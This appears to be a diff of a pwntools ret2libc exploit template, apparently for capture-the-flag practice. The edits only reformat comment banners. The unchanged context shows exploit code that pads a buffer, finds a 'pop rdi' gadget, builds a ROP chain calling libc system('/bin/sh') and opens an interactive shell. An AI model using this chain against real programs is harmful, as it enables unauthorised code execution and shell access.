@@ -1,9 +1,9 @@
 from pwn import * # Import pwntools
 
 
-####################
-#### CONNECTION ####
-####################
+###################
+### CONNECTION ####
+###################
 LOCAL = True
 REMOTETTCP = False
 REMOTESSH = False
@@ -36,9 +36,9 @@ if GDB:
     gdb.attach(p.pid, "continue")
 
 
-####################
-#### Find offset ###
-####################
+###################
+### Find offset ###
+###################
 OFFSET = "A"*40
 if OFFSET == "":
     gdb.attach(p.pid, "c") #Attach and continue
@@ -51,9 +51,9 @@ if OFFSET == "":
     exit()
 
 
-#####################
-#### Find Gadgets ###
-#####################
+####################
+### Find Gadgets ###
+####################
 PUTS_PLT = elf.plt['puts'] #PUTS_PLT = elf.symbols["puts"] # This is also valid to call puts
 MAIN_PLT = elf.symbols['main']
 POP_RDI = (rop.find_gadget(['pop rdi', 'ret']))[0] #Same as ROPgadget --binary vuln | grep "pop rdi"
@@ -93,9 +93,9 @@ if libc == "":
 # this implies that in the future if you search for functions in libc, the resulting address
 # will be the real one, you can use it directly (NOT NEED TO ADD AGAINF THE LIBC BASE ADDRESS)
 
-#################################
-### GET SHELL with known LIBC ###
-#################################
+################################
+## GET SHELL with known LIBC ###
+################################
 BINSH = next(libc.search("/bin/sh")) #Verify with find /bin/sh
 SYSTEM = libc.sym["system"]
 EXIT = libc.sym["exit"]
@@ -108,5 +108,5 @@ rop2 = OFFSET + p64(POP_RDI) + p64(BINSH) + p64(SYSTEM) + p64(EXIT)
 p.clean()
 p.sendline(rop2)
 
-##### Interact with the shell #####
+#### Interact with the shell #####
 p.interactive() #Interact with the conenction
